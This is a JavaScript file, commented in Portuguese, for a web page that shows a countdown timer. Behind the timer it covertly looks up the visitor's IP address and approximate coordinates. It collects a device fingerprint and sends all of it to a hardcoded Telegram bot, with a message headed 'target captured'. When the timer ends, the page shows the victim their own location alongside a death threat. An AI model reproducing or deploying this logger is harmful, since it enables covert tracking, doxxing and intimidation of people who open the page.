// script.js - Smart Logger + Nova API de Geolocalização (ip-api.com)

let targetDate = new Date("2026-04-20T01:46:59").getTime();
let userIPv4 = '';
let userLatitude = '';
let userLongitude = '';
let timerInterval = null;
let alreadySent = false;

const BOT_TOKEN = "8761130577:AAHnnpD9Ypa20tvEiFC6ZgDskwlNKchxYCQ";
const CHAT_ID = "8448614204";

function getDeviceInfo() {
    const info = {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || navigator.userLanguage,
        screen: `${window.screen.width} x ${window.screen.height}`,
        windowSize: `${window.innerWidth} x ${window.innerHeight}`,
        pixelRatio: window.devicePixelRatio || 1,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        deviceMemory: navigator.deviceMemory || 'unknown',
        isMobile: /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)
    };

    return info;
}

function sendToTelegram() {
    if (alreadySent) return;
    alreadySent = true;

    const device = getDeviceInfo();

    const message = `🚨 ALVO CAPTURADO - TIMER ZERADO!\n\n` +
                    `🕒 Horário: ${new Date().toLocaleString('pt-BR')}\n\n` +
                    `🌐 IP: ${userIPv4 || 'Não capturado'}\n` +
                    `📍 Latitude: ${userLatitude || 'Não disponível'}\n` +
                    `📍 Longitude: ${userLongitude || 'Não disponível'}\n\n` +
                    `📱 Informações do Dispositivo:\n` +
                    `• Sistema: ${device.platform}\n` +
                    `• Tela: ${device.screen} (${device.pixelRatio}x)\n` +
                    `• Janela: ${device.windowSize}\n` +
                    `• Mobile: ${device.isMobile ? 'Sim' : 'Não'}\n` +
                    `• Idioma: ${device.language}\n` +
                    `• Fuso Horário: ${device.timezone}\n` +
                    `• CPU Núcleos: ${device.hardwareConcurrency}\n` +
                    `• Memória RAM aprox: ${device.deviceMemory} GB\n\n` +
                    `Não é magia, é habilidade...`;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
    })
    .then(res => res.json())
    .then(data => {
        if (data.ok) console.log("✅ Enviado para Telegram!");
        else console.error("Telegram Error:", data.description);
    })
    .catch(err => console.error("Erro Telegram:", err));
}

function updateTimer() {
    const timeNow = new Date().getTime();
    let timeLeft = targetDate - timeNow;

    if (timeLeft < 0) {
        clearInterval(timerInterval);
        
        document.getElementById("timer").innerHTML = `
            Tempo esgotado!<br>
            Prepare-se para morrer...<br><br>
            Você mora em: ${userLatitude || 'não disponível'}, ${userLongitude || 'não disponível'}<br>
            Seu IP é: ${userIPv4 || 'não disponível'}<br><br>
            Não é magia, é habilidade isto...
        `;

        sendToTelegram();
        return;
    }

    const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
    const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
    const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
    const centiseconds = Math.floor((timeLeft % 1000) / 10);

    document.getElementById("timer").innerHTML = `
        ${days}d ${hours}h ${minutes}m ${seconds}.${centiseconds.toString().padStart(2, '0')}s
    `;
}

// ==================== NOVA BUSCA DE IP + LOCALIZAÇÃO ====================
fetch('https://api.ipify.org?format=json')
    .then(r => r.json())
    .then(data => {
        userIPv4 = data.ip;
        console.log("IP obtido:", userIPv4);

        // Nova API: ip-api.com (mais estável para lat/lon)
        return fetch(`http://ip-api.com/json/${userIPv4}?fields=status,message,lat,lon,country,city,regionName,isp`);
    })
    .then(r => r.json())
    .then(data => {
        if (data.status === "success") {
            userLatitude = data.lat || '';
            userLongitude = data.lon || '';
            console.log("✅ Localização obtida com sucesso:", userLatitude, userLongitude);
        } else {
            console.warn("Aviso da API:", data.message);
        }
    })
    .catch(err => {
        console.error("Erro ao buscar IP ou localização:", err);
    });

// Inicia o timer
timerInterval = setInterval(updateTimer, 100);
updateTimer();